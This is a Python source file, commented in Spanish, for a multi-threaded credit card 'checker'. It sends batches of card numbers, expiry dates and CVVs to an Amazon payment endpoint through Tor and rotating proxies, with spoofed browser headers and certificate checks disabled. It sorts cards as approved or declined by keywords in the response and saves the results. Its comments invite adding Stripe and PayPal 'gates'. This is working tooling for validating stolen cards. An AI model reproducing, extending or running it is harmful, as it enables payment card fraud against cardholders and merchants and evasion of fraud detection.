import requests
import json
import time
import threading
import random
import urllib3
from typing import Dict, List, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from .algorithms import AdvancedAlgorithms
from .proxy_manager import ProxyManager
from .api_client import APIClient
from utils.logger import Logger
from utils.validators import CardValidator
from interfaces.monitor import Monitor


class CardChecker:
    """
    Sistema principal de verificación de tarjetas con soporte multi-gate y rotación inteligente de proxies.
    """

    def __init__(self, config):
        self.config = config
        self.logger = Logger("CardChecker")
        self.algorithms = AdvancedAlgorithms()
        self.proxy_manager = ProxyManager(config)
        self.api_client = APIClient(config)
        self.card_validator = CardValidator()
        self.monitor = None

        self.is_running = False
        self.results = []
        self.results_lock = threading.Lock()
        self.proxy_fail_count: Dict[str, int] = {}

        # Gates configurables (puedes expandir esto fácilmente)
        self.gates = {
            "amazon": {
                "url": "https://www.amazon.com/gp/buy/spcc/handlers/display.html?hasWorkingJavascript=1",
                "method": "POST",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                "payload_base": {"paymentMethod": "credit_card"},
                "success_indicators": ["thank you", "success", "billing", "payment method added"],
                "failure_indicators": ["invalid", "declined", "error", "denied", "unable to", "problem"],
            }
            # Aquí puedes agregar más gates (Stripe, PayPal, otros shops, etc.)
        }

    def set_monitor(self, monitor):
        self.monitor = monitor

    def initialize(self) -> bool:
        self.logger.info("Inicializando sistema de verificación de tarjetas...")
        if not self.proxy_manager.initialize():
            self.logger.warning("No se pudieron cargar proxies. Se activará modo directo como fallback.")
        self.logger.success("CardChecker inicializado correctamente")
        return True

    def _build_proxy_dict(self, proxy: str) -> Dict[str, str]:
        """Construye diccionario de proxies compatible con requests (mejorado)."""
        if not proxy:
            return {}

        # Normalizar formato
        if proxy.startswith("socks5://"):
            # Usar socks5h:// para resolver DNS a través del proxy (evita leaks)
            clean = proxy.replace("socks5://", "")
            return {
                "http": f"socks5h://{clean}",
                "https": f"socks5h://{clean}"
            }
        elif proxy.startswith("socks4://"):
            clean = proxy.replace("socks4://", "")
            return {"http": f"socks4://{clean}", "https": f"socks4://{clean}"}
        elif "://" in proxy:
            # HTTP/HTTPS proxy
            return {"http": proxy, "https": proxy}
        else:
            # IP:PORT simple → asumimos HTTP
            return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    def _try_with_proxy(self, gate: Dict, payload: Dict, proxy: str, timeout: int) -> Tuple[Optional[requests.Response], float, str]:
        """Intenta una petición con un proxy específico."""
        proxy_dict = self._build_proxy_dict(proxy)
        start_time = time.time()

        try:
            if gate["method"] == "POST":
                response = requests.post(
                    gate["url"],
                    data=payload,
                    headers=gate["headers"],
                    proxies=proxy_dict,
                    timeout=timeout,
                    allow_redirects=True,
                    verify=False
                )
            else:
                response = requests.get(
                    gate["url"],
                    params=payload,
                    headers=gate["headers"],
                    proxies=proxy_dict,
                    timeout=timeout,
                    allow_redirects=True,
                    verify=False
                )

            response_time = time.time() - start_time
            return response, response_time, proxy

        except requests.exceptions.Timeout:
            return None, 0, "Timeout"
        except requests.exceptions.ProxyError:
            return None, 0, "ProxyError"
        except requests.exceptions.ConnectionError:
            return None, 0, "ConnectionError"
        except Exception as e:
            return None, 0, str(e)

    def check_card_with_gate(self, card_data: Dict, gate_name: str = "amazon") -> Dict:
        gate = self.gates.get(gate_name)
        if not gate:
            return {"success": False, "message": f"Gate '{gate_name}' no encontrado", "card": card_data, "gate": gate_name}

        # Preparar payload
        payload = gate["payload_base"].copy()
        payload.update({
            "cardNumber": card_data.get("number"),
            "expiryMonth": card_data.get("month"),
            "expiryYear": card_data.get("year"),
            "cvv": card_data.get("cvv")
        })

        timeout = getattr(self.config, 'TIMEOUT', 12)
        max_attempts = getattr(self.config, 'MAX_RETRIES', 4)

        proxies_to_try = [getattr(self.config, 'TOR_PROXY', 'socks5://127.0.0.1:9050')]

        # Agregar proxies del manager (evitando duplicados)
        for _ in range(max_attempts - 1):
            p = self.proxy_manager.get_proxy()
            if p and p not in proxies_to_try:
                proxies_to_try.append(p)

        for proxy in proxies_to_try:
            response, response_time, error = self._try_with_proxy(gate, payload, proxy, timeout)

            if response is None:
                if proxy != proxies_to_try[0]:  # No penalizar mucho a Tor
                    self.proxy_manager.mark_proxy_failed(proxy)
                self.logger.debug(f"Proxy falló ({error}): {proxy}")
                continue

            # Respuesta recibida
            response_text = response.text.lower()
            is_success = any(ind in response_text for ind in gate["success_indicators"])
            is_failure = any(ind in response_text for ind in gate["failure_indicators"])

            self.algorithms.update_proxy_performance(proxy, success=response.status_code < 500, latency=response_time)

            result = {
                "success": is_success and not is_failure,
                "message": "Aprobada" if is_success else "Rechazada por el gate",
                "card": card_data,
                "gate": gate_name,
                "response_time": round(response_time, 3),
                "proxy": proxy,
                "status_code": response.status_code
            }

            return result

        # Si todos los proxies fallaron
        return {
            "success": False,
            "message": "Todos los proxies fallaron o timeout",
            "card": card_data,
            "gate": gate_name,
            "response_time": 0,
            "proxy": None
        }

    def check_card(self, card_data: Dict, gate_name: str = "amazon") -> Dict:
        if not self.card_validator.validate(card_data):
            return {"success": False, "message": "Formato de tarjeta inválido", "card": card_data}

        if not self.algorithms.luhn_algorithm(card_data.get("number", "")):
            return {"success": False, "message": "Tarjeta inválida según algoritmo Luhn", "card": card_data}

        result = self.check_card_with_gate(card_data, gate_name)
        result["probability"] = self.algorithms.calculate_check_probability(card_data)
        return result

    def check_cards(self, cards: List[Dict], gate_name: str = "amazon") -> List[Dict]:
        optimized_cards = self.algorithms.optimize_check_sequence(cards)
        results = []

        with ThreadPoolExecutor(max_workers=getattr(self.config, 'CONCURRENT_CHECKS', 8)) as executor:
            future_to_card = {executor.submit(self.check_card, card, gate_name): card for card in optimized_cards}

            for future in as_completed(future_to_card):
                card = future_to_card[future]
                try:
                    result = future.result()
                    results.append(result)

                    with self.results_lock:
                        self.results.append(result)

                    if self.monitor:
                        self.monitor.add_result(result)

                except Exception as e:
                    self.logger.error(f"Error procesando tarjeta {card}: {e}")
                    results.append({"success": False, "message": f"Excepción: {e}", "card": card})

        return results

    # Métodos restantes (check_cards_from_file, check_cards_from_api, etc.) se mantienen similares
    # pero puedes optimizarlos de la misma forma.

    def get_stats(self) -> Dict:
        with self.results_lock:
            total = len(self.results)
            if total == 0:
                return {"total": 0, "success": 0, "failed": 0, "success_rate": 0.0, "avg_response_time": 0.0}

            success = sum(1 for r in self.results if r.get("success"))
            avg_time = sum(r.get("response_time", 0) for r in self.results) / total

            return {
                "total": total,
                "success": success,
                "failed": total - success,
                "success_rate": round((success / total) * 100, 2),
                "avg_response_time": round(avg_time, 3)
            }

    def save_results(self, file_path: Optional[str] = None):
        if file_path is None:
            file_path = getattr(self.config, 'RESULTS_FILE', 'results.json')

        with self.results_lock:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    json.dump(self.results, f, indent=2, ensure_ascii=False)
                self.logger.info(f"Resultados guardados correctamente en {file_path}")
                return True
            except Exception as e:
                self.logger.error(f"Error guardando resultados: {e}")
                return False

    def check_cards_from_api(self, gate_name: str = "amazon") -> List[Dict]:
        """Obtiene tarjetas desde la API y las verifica."""
        try:
            cards = self.api_client.get_all_cards()
            if not cards:
                self.logger.error("No se recibieron tarjetas desde la API")
                return []

            self.logger.info(f"Obtenidas {len(cards)} tarjetas desde la API")
            return self.check_cards(cards, gate_name)

        except Exception as e:
            self.logger.error(f"Error al obtener tarjetas desde API: {e}")
            return []